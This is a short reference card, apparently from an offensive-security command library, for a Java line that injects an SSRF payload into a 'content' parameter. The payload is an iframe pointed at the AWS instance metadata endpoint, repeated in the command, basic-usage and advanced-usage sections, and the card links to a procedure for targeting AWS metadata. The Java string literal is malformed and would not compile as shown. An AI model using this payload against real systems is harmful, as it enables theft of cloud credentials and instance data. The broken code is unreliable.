---
id: cmd-set-content-ssrf-001
data: >-
  parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<iframe
  src=http://169.254.169.254/latest/meta-data/></iframe>\"}"]");
tags:
  - ssrf
  - payload
type: command
output: Parameter added to map
executor: java
platforms:
  - Java
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.598Z'
verified: false
validated: true
submitted: true
---
# set-content-ssrf-payload

## Command

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<iframe src=http://169.254.169.254/latest/meta-data/></iframe>\"}"]");
```

## Description

Updates the 'content' parameter with a JSON-encoded iframe payload targeting AWS metadata for SSRF during preview.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| parameters | HashMap | Yes |
| content | Escaped JSON with iframe src | Yes |

## Examples

### Basic Usage

```java
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<iframe src=http://169.254.169.254/latest/meta-data/></iframe>\"}"]");
```

### Advanced Usage

Overwrite existing:

```java
// Assume parameters exists
parameters.put("content", "[{\"type\":\"h1\",\"text\":\"asd>\\"'<iframe src=http://169.254.169.254/latest/meta-data/></iframe>\"}"]");
System.out.println(parameters); // Verify
```

## Expected Output

No output; 'content' key updated with SSRF payload.

## Related

- [[commands/set-content-xss-payload]]
- [[procedures/Modify-Payload-for-SSRF-to-Target-AWS-Metadata]]
